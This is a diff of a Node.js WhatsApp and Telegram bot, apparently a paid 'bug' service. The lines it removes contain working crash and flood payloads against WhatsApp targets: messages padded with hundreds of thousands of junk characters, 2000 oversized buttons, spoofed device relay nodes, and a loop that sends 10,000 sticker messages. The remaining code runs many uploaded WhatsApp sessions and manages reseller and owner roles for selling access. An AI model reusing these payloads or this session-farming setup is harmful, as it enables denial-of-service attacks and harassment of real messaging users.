-name: "⤻꙳͙͡༑𝐃𝐄𝐍𝐈𝐒 𝐋𝐄𝐖𝐀𝐓 𝐍𝐈😂" + "ꦽ⸙".repeat(60000),
-address: ".sevrin444 ( @denissayang )",
-url: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/" + "ꦽ⸙".repeat(60000),
-clickToWhatsappCall: true,
-contextInfo: {
-businessMessageForwardInfo: {
-businessOwnerJid: target
-},
-mentionedJid: [target,"13135550002@s.whatsapp.net"]
-}
-}
-},
-{ participant: {jid: target} }
-)
-}
-
-async function exeTrash(sock, target) {
-  try {
-    const exeTrash = "ꦾ".repeat(500000);
-    const buttons = [];    
-    for (let b = 0; b < 2000; b++) {
-      buttons.push({
-        buttonId: 'btn_' + "\x10".repeat(100000), 
-        buttonText: {
-          displayText: exeTrash.substring(0, 5000) 
-        },
-        type: 1
-      });
-    }
-    
-    await sock.relayMessage(
-      target,
-      {
-        buttonsMessage: {
-          contentText: "# 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭" + exeTrash.substring(0, 60000),
-          footerText: exeTrash.substring(0, 60000),
-          buttons: buttons,
-          headerType: 1,
-          viewOnce: true
-        }
-      },
-      {
-        messageId: null
-      }
-    ).catch(() => {}); 
-
-  } catch (e) {
-    console.log(`error: ${e.message}`);
-  }
-}
-const {
-  generateMessageIDV2, encodeSignedDeviceIdentity,jidEncode
-    
-} = require("@whiskeysockets/baileys");
-
-//==========================================//
-
-const relayMSGCustom = async (sock, target, message) => {
-  const authVsP = sock.authState.creds.me.id;
-  const meLid = sock.authState.creds.me?.lid;
-
-  const { user: mePN } = jidDecode(authVsP);
-  const { user: meLidU } = meLid ? jidDecode(meLid) : { user: null };
-
-  const msgId = generateMessageIDV2(authVsP);
-  const ngentodd = jidEncode(jidDecode(meLid)?.user, "lid", undefined);
-
-  const meMsg = {
-    deviceSentMessage: {
-      destinationJid: target,
-      message
-    },
-    messageContextInfo: message.messageContextInfo
-  };
-
-  const VsP = {};
-
-  const mediaTypeVsP =
-    message.imageMessage ? "image" : message.videoMessage ? message.videoMessage.gifPlayback ? "gif" : "video" : message.audioMessage ? message.audioMessage.ptt ? "ptt" : "audio" : message.documentMessage ? "document" : message.stickerMessage ? "sticker" : undefined;
-
-  if (mediaTypeVsP) VsP.mediatype = mediaTypeVsP;
-  let stanza;
-  await sock.authState.keys.transaction(async () => {
-    const devices = await sock.getUSyncDevices([ngentodd, target], true, false);
-    const meR = [];
-    const otR = [];
-    for (const { user, jid: dJid } of devices) {
-      if (dJid === authVsP || (meLid && dJid === meLid)) continue;
-      const isMe = user === mePN || user === meLidU;
-      (isMe ? meR : otR).push(dJid);
-    }
-
-    const all = [...meR, ...otR];
-    await sock.assertSessions(all);
-    const [
-      { nodes: meN, shouldIncludeDeviceIdentity: s1 },
-      { nodes: otN, shouldIncludeDeviceIdentity: s2 }
-    ] = await Promise.all([
-      sock.createParticipantNodes(meR, {
-        conversation: "⟨〽⃟💛✩ ᜴𝐕࿆𝐬𝐏࿆ꢵ ✩💛⃟〽⟩"
-      }),
-      sock.createParticipantNodes(otR, message, VsP, meMsg)
-    ]);
-
-    const ahahahk = [
-      ...meN.map(n => {
-        n.content[0].content = Buffer.from("hello world", "base64");
-        return n;
-      }),
-      ...otN
-    ];
-
-    const incDI = s1 || s2;
-    stanza = {
-      tag: "message",
-      attrs: {
-        id: msgId,
-        to: target,
-        type: ["imageMessage", "videoMessage", "audioMessage", "documentMessage", "stickerMessage"].some(k => k in message) ? "media" : "reactionMessage" in message ? "reaction" : "text"
-      },
-      content: ahahahk.length ? [{ tag: "participants", attrs: {}, content: ahahahk }] : []
-    };
-
-    if (incDI) {
-      stanza.content.push({
-        tag: "device-identity",
-        attrs: {},
-        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
-      });
-    }
-
-    await sock.sendNode(stanza);
-  }, authVsP);
-
-  return stanza;
-};
-
-//==========================================//
-
-async function VxLOneMsg(sock, target) {
-  await sock.sendMessage(target, { 
-    text: "VxL - Execute #Fahri"
-  });  
-
-  for (let r = 0; r < 10000; r++) {
-    await sock.relayMessage(target, {
-      groupStatusMessageV2: {
-        message: {
-          stickerMessage: {
-            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-            mimetype: "image/webp",
-            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-            fileLength: "10610",
-            mediaKeyTimestamp: "1775044724",
-            stickerSentTs: "1775044724091"
-          }
-        }
-      }
-    }, { participant: { jid: target }, messageId: null });
-    await new Promise((r) => setTimeout(r, 1500));
-  }
-}
-// ======================================= //
-// WhatsApp Connect Logic
+// ========== WAITING & SLEEP ==========
 const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
 function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
+
+// ========== ACTIVE CONNECTIONS ==========
 const activeConnections = {};
-const biz = {};   // Untuk WA Business
-const mess = {};  // Untuk WA Messenger
+const biz = {};   
+const mess = {};  
 
 function prepareAuthFolders() {
   const userId = "permenmd";
@@ -4169,19 +3869,18 @@ function prepareAuthFolders() {
       if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
     }
 
-    return files; // ✅ Tambahkan return
+    return files; 
   } catch (err) {
     console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
     safeExit();
   }
 }
 
-// === Setup VIP Folder ===
 function getVipSessionPath(sessionName) {
   return path.join('vip', sessionName);
 }
+
 function setupVipFolder() {
-  // Ganti path menjadi root folder 'vip', bukan di dalam 'permenmd'
   const vipPath = path.join(__dirname, 'vip');
 
   try {
@@ -4207,69 +3906,7 @@ function detectWATypeFromCreds(filePath) {
   } catch {
     return "Unknown";
   }
-}/*
-
-async function connectSession(folderPath, sessionName, retries = 5) {
-  if (activeConnections[sessionName]) return activeConnections[sessionName];
-
-  const sessionsFold = path.join(folderPath, sessionName);
-
-  return new Promise(async (resolve) => {
-    try {
-      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
-      const { version } = await fetchLatestBaileysVersion();
-
-      const sock = makeWASocket({
-        auth: state,
-        printQRInTerminal: false,
-        logger: pino({ level: "silent" }),
-        version: version,
-        defaultQueryTimeoutMs: undefined,
-      });
-
-      sock.ev.on("creds.update", saveCreds);
-
-      sock.ev.on("connection.update", async (update) => {
-        const { connection, lastDisconnect, qr } = update;
-
-        if (qr) qrCodes[sessionName] = qr;
-
-        if (connection === "open") {
-          delete qrCodes[sessionName];
-          activeConnections[sessionName] = sock;
-
-          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
-          console.log(`[${sessionName}] Connected. Type: ${type}`);
-
-          if (type === "Business") biz[sessionName] = sock;
-          else if (type === "Messenger") mess[sessionName] = sock;
-
-          resolve(sock);
-        } else if (connection === "close") {
-          const statusCode = lastDisconnect?.error?.output?.statusCode;
-          const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;
-
-          if (isLoggedOut) {
-            console.log(`[${sessionName}] Logged out.`);
-            fs.rmSync(sessionsFold, { recursive: true, force: true });
-            delete activeConnections[sessionName];
-            delete biz[sessionName];
-            delete mess[sessionName];
-            resolve(null);
-          } else if (retries > 0) {
-            setTimeout(() => connectSession(folderPath, sessionName, retries - 1).then(resolve), 5000);
-          } else {
-            console.log(`${sessionName} Connection failed after retries.`);
-            resolve(null);
-          }
-        }
-      });
-    } catch (err) {
-      console.log(`[${sessionName}] Error connecting: ${err.message}`);
-      resolve(null);
-    }
-  });
-}*/
+}
 
 async function connectSession(folderPath, sessionName, retries = 100) {
   return new Promise(async (resolve) => {
@@ -4354,7 +3991,6 @@ async function connectNewUserSessionsOnly() {
     const baseName = path.basename(file, '.json');
     const sessionFolder = path.join(userIdFolder, baseName);
 
-    // Skip jika sudah ada koneksi aktif
     if (activeConnections[baseName]) {
       console.log(`[${baseName}] Sudah terhubung, skip.`);
       continue;
@@ -4369,18 +4005,14 @@ async function connectNewUserSessionsOnly() {
       }
     }
 
-    // Sambungkan sesi baru
     connectSession(sessionFolder, baseName);
   }
 }
 
-// Jika ingin refresh tanpa putus semua, pakai ini:
 async function refreshUserSessions() {
   await startUserSessions();
-  //startLoop();
 }
 
-//const axios = require("axios");
 const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";
 
 async function unfollowAllChannel() {
@@ -4401,7 +4033,7 @@ async function unfollowAllChannel() {
         console.log(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
         await new Promise(resolve => setTimeout(resolve, 1500));
       } catch (err) {
-        console.log(`Gagal unfollow ${jid}:`, err.message);
+        console.log("Gagal unfollow ${jid}:", err.message);
       }
     }
 
@@ -4447,7 +4079,6 @@ async function pairingWa(number, owner, attempt = 1) {
       }
     } else if (connection === "open") {
       try {
-        
         await sock.newsletterFollow("120363404995533206@newsletter");
         await sock.newsletterFollow("120363330344810280@newsletter");
         await sleep(5000);
@@ -4463,8 +4094,8 @@ async function pairingWa(number, owner, attempt = 1) {
       try {
         await waiting(3000)
         if (fs.existsSync(sourceCreds)) {
-          const data = fs.readFileSync(sourceCreds); // baca isi file sumber
-          fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
+          const data = fs.readFileSync(sourceCreds); 
+          fs.writeFileSync(destCreds, data); 
           console.log(`✅ Rewrote session to ${destCreds}`);
         }
       } catch (e) {
@@ -4477,79 +4108,10 @@ async function pairingWa(number, owner, attempt = 1) {
 }
 
 async function startUserSessions() {
-  const vipDir = 'vip';
   const baseDir = 'permenmd';
-    /*if (fs.existsSync(vipDir)) {
-  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
-  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);
-    for (const file of vipFiles) {
-  const sessionName = path.basename(file, '.json');
-  const jsonFile = path.join(vipDir, file);        // vip/628xxx.json
-  const sessionFolder = path.join(vipDir, sessionName); // vip/628xxx/
-
-  if (activeConnections[sessionName]) {
-    console.log(`[SKIP] VIP ${sessionName} already active.`);
-    continue;
-  }
-
-  if (!fs.existsSync(sessionFolder)) {
-    fs.mkdirSync(sessionFolder, { recursive: true });
-    fs.copyFileSync(jsonFile, path.join(sessionFolder, 'creds.json'));
-    console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
-  }
-
-  try {
-    console.log(`[START] Connecting VIP: ${sessionName}`);
-    await connectSession(sessionFolder, sessionName, 100, () => {
-      // Callback kalau session mati → hapus json asli juga
-      if (fs.existsSync(jsonFile)) {
-        fs.rmSync(jsonFile, { force: true });
-        console.log(`[🗑️] VIP json dihapus: ${file}`);
-      }
-    });
-  } catch (err) {
-    console.error(`[ERROR] VIP ${sessionName}:`, err.message);
-  }
-}*/
-/*
-
-  // 1. Scan VIP Folder (Root)
-  if (fs.existsSync(vipDir)) {
-  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
-  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);
-
-  for (const file of vipFiles) {
-    const sessionName = path.basename(file, '.json');
-
-    if (activeConnections[sessionName]) {
-      console.log(`[SKIP] VIP ${sessionName} already active.`);
-      continue;
-    }
-
-    // Buat folder sementara vip/628xxx/ lalu taruh creds.json di sana
-    const sessionFolder = path.join(vipDir, sessionName);
-    if (!fs.existsSync(sessionFolder)) {
-      fs.mkdirSync(sessionFolder, { recursive: true });
-      fs.copyFileSync(
-        path.join(vipDir, file),         // vip/628xxx.json
-        path.join(sessionFolder, 'creds.json') // vip/628xxx/creds.json
-      );
-      console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
-    }
-
-    try {
-      console.log(`[START] Connecting VIP: ${sessionName}`);
-      await connectSession(vipDir, sessionName);
-    } catch (err) {
-      console.error(`[ERROR] VIP ${sessionName}:`, err.message);
-    }
-  }
-}
-await sleep(20000);*/
-  // 2. Scan User Folders (Logika Anda yang disederhanakan)
   const subfolders = fs.readdirSync(baseDir)
     .map(name => path.join(baseDir, name))
-    .filter(p => fs.lstatSync(p).isDirectory()); // Filter hanya folder saja
+    .filter(p => fs.lstatSync(p).isDirectory()); 
 
   console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);
 
@@ -4564,7 +4126,6 @@ await sleep(20000);*/
       for (const jsonFile of jsonFiles) {
         const sessionName = `${path.basename(jsonFile, ".json")}`;
 
-        // ✅ Cek apakah session sudah aktif
         if (activeConnections[sessionName]) {
           console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
           continue;
@@ -4573,7 +4134,6 @@ await sleep(20000);*/
         try {
           console.log(`[START] Connecting session: ${sessionName}`);
           await connectSession(folder, sessionName);
-            
         } catch (err) {
           console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
         }
@@ -4582,8 +4142,8 @@ await sleep(20000);*/
       console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
     }
   }
-    
 }
+
 function prepareVipSessionFolders() {
   const vipFolder = 'vip';
   try {
@@ -4602,7 +4162,6 @@ function prepareVipSessionFolders() {
     }
     return files;
   } catch (err) {
-    logger.error("Error preparing VIP folders:", err.message);
     return [];
   }
 }
@@ -4615,13 +4174,15 @@ async function startVipSessions() {
     await connectSession('vip', baseName);
   }
 }
+
 function getRandomVipConnection() {
   const conns = getActiveVipConnections();
   const keys = Object.keys(conns);
   if (keys.length === 0) return null;
   return conns[keys[Math.floor(Math.random() * keys.length)]];
 }
-   function getActiveVipConnections() {
+
+function getActiveVipConnections() {
   const vipConnections = {};
   for (const sessionName in activeConnections) {
     if (fs.existsSync(getVipSessionPath(sessionName))) {
@@ -4631,7 +4192,6 @@ function getRandomVipConnection() {
   return vipConnections;
 } 
 
-// Helper: Ambil socket yang aktif dari sebuah path folder
 function getActiveSocketsFromPath(folderPath) {
   if (!fs.existsSync(folderPath)) return [];
 
@@ -4647,88 +4207,42 @@ function getActiveSocketsFromPath(folderPath) {
 
   return activeSockets;
 }
-// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
+
 function checkActiveSessionInFolder(subfolderName) {
   const folderPath = path.join('permenmd', subfolderName);
-
-  // Cek jika folder tidak ada, return null langsung
   if (!fs.existsSync(folderPath)) return null;
 
   const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
   for (const file of jsonFiles) {
     const sessionName = `${path.basename(file, ".json")}`;
     if (activeConnections[sessionName]) {
-      return activeConnections[sessionName]; // return socket aktif
+      return activeConnections[sessionName]; 
     }
   }
-  return null; // Tidak ada sesi aktif
+  return null; 
 }
-
 
 const telegramDataPath = "telegram.json";
 const dbPath = "database.json";
 
-// ===== STORAN SYSTEM =====
-const STORAN_FILE = './storan.json';
-const QR_CODE_PAYMENT = config.QR_CODE_PAYMENT;
-
-const STORAN_DATA = {
-  pending: [],
-  history: []
-};
-
-function loadStoranData() {
-  if (!fs.existsSync(STORAN_FILE)) {
-    fs.writeFileSync(STORAN_FILE, JSON.stringify(STORAN_DATA, null, 2));
-  }
-  return JSON.parse(fs.readFileSync(STORAN_FILE));
-}
-
-function saveStoranData(data) {
-  fs.writeFileSync(STORAN_FILE, JSON.stringify(data, null, 2));
-}
-
-function generateStoranId() {
-  return 'STOR-' + Date.now().toString(36).toUpperCase();
-}
-// ===== Helpers =====
 function loadTelegramConfig() {
-  if (!fs.existsSync(telegramDataPath)) {
-    fs.writeFileSync(telegramDataPath, JSON.stringify({ 
-      ownerList: [], 
-      userList: [],
-      resList: [],
-      ptList: [],
-      tkList: []
-    }, null, 2));
-  }
+  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
   return JSON.parse(fs.readFileSync(telegramDataPath));
 }
 
-function loadDatabase() {
-  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
-  return JSON.parse(fs.readFileSync(dbPath));
-}
-
-function saveDatabase(data) {
-  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
-}
-
-function generateKey() {
-  return crypto.randomBytes(8).toString("hex");
+function getFormattedUsers() {
+  const db = loadDatabaseCached();
+  return db.users.map(u => `👤 ${u.username} | 🎯 ${u.role || 'full up'} | ⏳ ${u.expiredDate}`).join("\n");
 }
 
 async function downloadToBuffer(url) {
   try {
-    const response = await axios.get(url, {
-      responseType: 'arraybuffer'
-    });
+    const response = await axios.get(url, { responseType: 'arraybuffer' });
     return Buffer.from(response.data);
   } catch (error) {
     throw error;
   }
 }
-
 
 function isValidBaileysCreds(jsonData) {
   if (typeof jsonData !== 'object' || jsonData === null) return false;
@@ -4745,124 +4259,193 @@ function isValidBaileysCreds(jsonData) {
   return requiredKeys.every(key => key in jsonData);
 }
 
-function getFormattedUsers() {
-  const db = loadDatabase();
-  if (db.length === 0) return "Belum ada user terdaftar.";
-  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
-}
-
-bot.onText(/^\/?(start|menu)/, (msg) => {
-  const chatId = msg.chat.id;
-  const userId = msg.from.id;
-  
-  console.log(`[BOT] /start dari user: ${userId} (${msg.from.first_name}) di chat: ${chatId}`);
-  
-  const config = loadTelegramConfig();
-  
-  console.log(`[BOT] Config: ownerList=${config.ownerList}, userList=${config.userList}, resList=${config.resList}, ptList=${config.ptList}, tkList=${config.tkList}`);
-  
-  const isOwner = config.ownerList.includes(userId);
-  const isPt = config.ptList && config.ptList.includes(userId);
-  const isRes = config.resList && config.resList.includes(userId);
-  const isTk = config.tkList && config.tkList.includes(userId);
-  const isUser = config.userList.includes(userId);
-
-  console.log(`[BOT] Hasil cek: isOwner=${isOwner}, isPt=${isPt}, isRes=${isRes}, isTk=${isTk}, isUser=${isUser}`);
-
-  if (!isOwner && !isPt && !isRes && !isTk && !isUser) {
-    console.log(`[BOT] User ${userId} TIDAK TERDAFTAR, kirim pesan`);
-    return bot.sendMessage(chatId, `<blockquote>❌ Anda Tidak Memiliki Izin\n\nHubungi Owner untuk mendapatkan akses.\n\n🆔 ID Anda: ${userId}</blockquote>`, { parse_mode: "HTML" });
-  }
-
-  if (isUser && !isOwner && !isPt && !isRes && !isTk) {
-    console.log(`[BOT] User ${userId} adalah USER BIASA`);
-    return bot.sendMessage(chatId, `<blockquote>❌ Anda Tidak Memiliki Izin\n\nHubungi Owner untuk mendapatkan akses.\n\n🆔 ID Anda: ${userId}</blockquote>`, { parse_mode: "HTML" });
-  }
-
-  let buttons = [];
-
-  if (isRes && !isPt && !isTk && !isOwner) {
-    // RES - 2 kolom
-    buttons = [
-      [{ text: "👾 Buat Member", callback_data: "create_member" }, { text: "👾 Buat Reseller", callback_data: "create_reseller" }],
-      [{ text: "📦 Storan", callback_data: "storan" }]
-    ];
-  }
-
-  else if (isPt && !isTk && !isOwner) {
-    // PT - 2 kolom
-    buttons = [
-      [{ text: "👾 Buat Member", callback_data: "create_member" }, { text: "👾 Buat Reseller", callback_data: "create_reseller" }],
-      [{ text: "👾 Buat VIP", callback_data: "create_vip" }, { text: "➕ Add Reseller", callback_data: "add_res" }],
-      [{ text: "📦 Storan", callback_data: "storan" }]
-    ];
-  }
-
-  else if (isOwner && !isTk) {
-    // OWNER - 2 kolom
-    buttons = [
-      [{ text: "👾 Buat Member", callback_data: "create_member" }, { text: "👾 Buat Reseller", callback_data: "create_reseller" }],
-      [{ text: "👾 Buat VIP", callback_data: "create_vip" }, { text: "👾 Buat Admin", callback_data: "create_admin" }],
-      [{ text: "👾 Buat Owner", callback_data: "create_owner" }, { text: "➕ Add Reseller", callback_data: "add_res" }],
-      [{ text: "➕ Add Partner", callback_data: "add_pt" }, { text: "➕ Add Owner", callback_data: "add_owner" }],
-      [{ text: "⏳ Set Expired", callback_data: "set_expire" }, { text: "📦 Storan", callback_data: "storan" }],
-      [{ text: "📋 List User", callback_data: "list_user" }, { text: "🗑 Hapus User", callback_data: "delete_user" }]
-    ];
-  }
-  
-  else if (isTk) {
-    // TK - 2 kolom
-    buttons = [
-      [{ text: "👾 Buat Member", callback_data: "create_member" }, { text: "👾 Buat Reseller", callback_data: "create_reseller" }],
-      [{ text: "👾 Buat VIP", callback_data: "create_vip" }, { text: "👾 Buat Admin", callback_data: "create_admin" }],
-      [{ text: "👾 Buat Owner", callback_data: "create_owner" }, { text: "➕ Add Reseller", callback_data: "add_res" }],
-      [{ text: "➕ Add Partner", callback_data: "add_pt" }, { text: "➕ Add Owner", callback_data: "add_owner" }],
-      [{ text: "➕ Add TK", callback_data: "add_tk" }, { text: "⏳ Set Expired", callback_data: "set_expire" }],
-      [{ text: "📦 Storan", callback_data: "storan" }, { text: "📋 List User", callback_data: "list_user" }],
-      [{ text: "🗑 Hapus User", callback_data: "delete_user" }]
-    ];
-  }
-
-  const options = {
-    reply_markup: {
-      inline_keyboard: buttons
+// ─── HANDLER /start UNTUK PRIVATE (MENU) ─────────────
+bot.start(async (ctx) => {
+    if (menuAnimation) {
+        clearInterval(menuAnimation);
+        menuAnimation = null;
     }
-  };
 
-  console.log(`[BOT] Kirim menu ke ${userId}`);
-  bot.sendMessage(chatId, `<blockquote>👋 Halo ${msg.from.first_name}, pilih menu:</blockquote>`, { ...options, parse_mode: "HTML" });
+    const userId = ctx.from.id;
+    const config = loadTelegramConfig();
+    const isDev = config.devList && config.devList.includes(userId);
+    const isOwner = config.ownerList && config.ownerList.includes(userId);
+    const isPt = config.ptList && config.ptList.includes(userId);
+    const isVip = config.vipList && config.vipList.includes(userId);
+    const isReseller = config.resellerList && config.resellerList.includes(userId);
+    const isFullup = config.fullupList && config.fullupList.includes(userId);
+    const isUser = config.userList && config.userList.includes(userId);
+
+    if (!isDev && !isOwner && !isPt && !isVip && !isReseller && !isFullup && !isUser) {
+        return ctx.replyWithHTML(`<blockquote>❌ Anda Tidak Memiliki Izin\n\nHubungi Owner untuk mendapatkan akses.\n\n🆔 ID Anda: ${userId}</blockquote>`);
+    }
+
+    let role = null;
+    if (isDev) role = 'developer';
+    else if (isOwner) role = 'owner';
+    else if (isPt) role = 'pt';
+    else if (isVip) role = 'vip';
+    else if (isReseller) role = 'reseller';
+    else if (isFullup) role = 'fullup';
+    else role = 'member';
+
+    const menuMessage = `<blockquote>👋 Halo ${ctx.from.first_name}, pilih menu:</blockquote>`;
+    const videoUrl = getRandomVidio();
+
+    const payload = {
+        caption: menuMessage,
+        parse_mode: "HTML",
+        reply_markup: getMainKeyboard(role)
+    };
+
+    if (ctx.chat.type === "private") {
+        payload.message_effect_id = menuEffects[Math.floor(Math.random() * menuEffects.length)];
+    }
+
+    const msg = await ctx.replyWithVideo(videoUrl, payload);
+
+    menuMsg = {
+        chat_id: ctx.chat.id,
+        message_id: msg.message_id,
+        role: role
+    };
+
+    menuAnimation = setInterval(async () => {
+        try {
+            await ctx.telegram.editMessageReplyMarkup(
+                menuMsg.chat_id,
+                menuMsg.message_id,
+                null,
+                getMainKeyboard(menuMsg.role)
+            );
+        } catch (err) {}
+    }, 3000);
 });
+
+bot.on('text', async (ctx) => {
+    const chatId = ctx.chat.id;
+    const userId = ctx.from.id;
+    const text = ctx.message.text;
+
+    // COMMANDS
+    if (text.startsWith('/addreseller')) return handleAddReseller(ctx);
+    if (text.startsWith('/addvip')) return handleAddVip(ctx);
+    if (text.startsWith('/addpt')) return handleAddPt(ctx);
+    if (text.startsWith('/addowner')) return handleAddOwner(ctx);
+    if (text.startsWith('/adddev')) return handleAddDev(ctx);
+    if (text.startsWith('/info')) return handleInfo(ctx);
+    if (text.startsWith('/clear')) return handleClear(ctx);
+    if (text.startsWith('/restart')) return handleRestart(ctx);
+
+    // ADD ROLE STATE
+    if (addRoleState[userId]) {
+        const targetId = parseInt(text.trim());
+        if (isNaN(targetId)) {
+            delete addRoleState[userId];
+            return bot.telegram.sendMessage(chatId, `<blockquote>❌ ID tidak valid!</blockquote>`, { parse_mode: "HTML" });
+        }
+        const roleType = addRoleState[userId].role;
+        const config = loadTelegramConfig();
+        const roleMap = {
+            reseller: { list: "resellerList", label: "RESELLER" },
+            vip: { list: "vipList", label: "VIP" },
+            pt: { list: "ptList", label: "PT" },
+            owner: { list: "ownerList", label: "OWNER" },
+            developer: { list: "devList", label: "DEVELOPER" }
+        };
+        const role = roleMap[roleType];
+        if (!role) {
+            delete addRoleState[userId];
+            return bot.telegram.sendMessage(chatId, `<blockquote>❌ Role tidak dikenal.</blockquote>`, { parse_mode: "HTML" });
+        }
+        if (!config[role.list]) config[role.list] = [];
+        if (config[role.list].includes(targetId)) {
+            delete addRoleState[userId];
+            return bot.telegram.sendMessage(chatId, `<blockquote>❌ User sudah memiliki role ${role.label}.</blockquote>`, { parse_mode: "HTML" });
+        }
+        config[role.list].push(targetId);
+        fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
+        delete addRoleState[userId];
+        bot.telegram.sendMessage(chatId, `<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: ${role.label}</blockquote>`, { parse_mode: "HTML" });
+        return;
+    }
+
+    // DELETE USER
+    if (deleteUserState[userId] && deleteUserState[userId].step === "waiting_username") {
+        const username = text.trim();
+        const db = loadDatabase();
+        const index = db.findIndex(u => u.username === username);
+        if (index === -1) {
+            delete deleteUserState[userId];
+            return bot.telegram.sendMessage(chatId, `<blockquote>❌ User tidak ditemukan.</blockquote>`, { parse_mode: "HTML" });
+        }
+        const deleted = db.splice(index, 1)[0];
+        saveDatabase(db);
+        delete deleteUserState[userId];
+        bot.telegram.sendMessage(chatId, `<blockquote>🗑️ User ${deleted.username} berhasil dihapus.</blockquote>`, { parse_mode: "HTML" });
+        return;
+    }
+
+    // SET EXPIRE
+    if (setExpireState[userId] && setExpireState[userId].step === "waiting_data") {
+        const [username, addDays] = text.split("|").map(s => s.trim());
+        if (!username || !addDays || isNaN(parseInt(addDays))) {
+            return bot.telegram.sendMessage(chatId, `<blockquote>❌ Format salah!\nGunakan: username|tambah_hari</blockquote>`, { parse_mode: "HTML" });
+        }
+        const db = loadDatabase();
+        const user = db.find(u => u.username === username);
+        if (!user) {
+            delete setExpireState[userId];
+            return bot.telegram.sendMessage(chatId, `<blockquote>❌ User tidak ditemukan.</blockquote>`, { parse_mode: "HTML" });
+        }
+        const current = new Date(user.expiredDate);
+        current.setDate(current.getDate() + parseInt(addDays));
+        user.expiredDate = current.toISOString().split("T")[0];
+        saveDatabase(db);
+        delete setExpireState[userId];
+        bot.telegram.sendMessage(chatId, `<blockquote>✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}</blockquote>`, { parse_mode: "HTML" });
+        return;
+    }
+
+    // CREATE ACCOUNT
+    if (createAccountState[userId] && createAccountState[userId].step === "waiting_account_data") {
+        const parts = text.split("|").map(s => s.trim());
+        if (parts.length !== 3) {
+            return bot.telegram.sendMessage(chatId, `<blockquote>❌ Format salah!\nGunakan: username|password|durasi_hari</blockquote>`, { parse_mode: "HTML" });
+        }
+        const [username, password, day] = parts;
+        const db = loadDatabase();
+        const roleName = createAccountState[userId].role;
+        if (db.find(u => u.username === username)) {
+            return bot.telegram.sendMessage(chatId, `<blockquote>❌ Username sudah ada!</blockquote>`, { parse_mode: "HTML" });
+        }
+        const expired = new Date();
+        expired.setDate(expired.getDate() + parseInt(day));
+        db.push({ username, password, role: roleName, expiredDate: expired.toISOString().split("T")[0] });
+        saveDatabase(db);
+        delete createAccountState[userId];
+        bot.telegram.sendMessage(chatId, `<blockquote>✅ Akun ${roleName.toUpperCase()} dibuat:\n👤 Username: ${username}\n🔐 Password: ${password}\n📅 Expired: ${expired.toISOString().split("T")[0]}</blockquote>`, { parse_mode: "HTML" });
+        return;
+    }
+
+    // STORAN
+    const storanData = loadStoranData();
+    const pending = storanData.pending.find(s => s.userId === userId);
+    if (pending && pending.step === "waiting_username") {
+        return handleStoranUsername(chatId, userId, text);
+    }
+});
+
 bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
-  const userId = msg.from.id;
-
-  // ===== HANDLE STORAN =====
-  const storanData = loadStoranData();
-  const pending = storanData.pending.find(s => s.userId === userId);
-  
-  if (pending) {
-    if (msg.photo) {
-      const photoId = msg.photo[msg.photo.length - 1].file_id;
-      if (pending.step === "waiting_ss") {
-        return handleStoranSS(chatId, userId, photoId);
-      } else if (pending.step === "waiting_qr_ss") {
-        return handleStoranQrSS(chatId, userId, photoId);
-      }
-    }
-    if (msg.text && pending.step === "waiting_username") {
-      return handleStoranUsername(chatId, userId, msg.text);
-    }
-  }
 
   if (msg.document) {
     const fileName = msg.document.file_name || '';
-    if (!fileName.endsWith('.json')) {
-      return;
-    }
+    if (!fileName.endsWith('.json')) return;
 
     try {
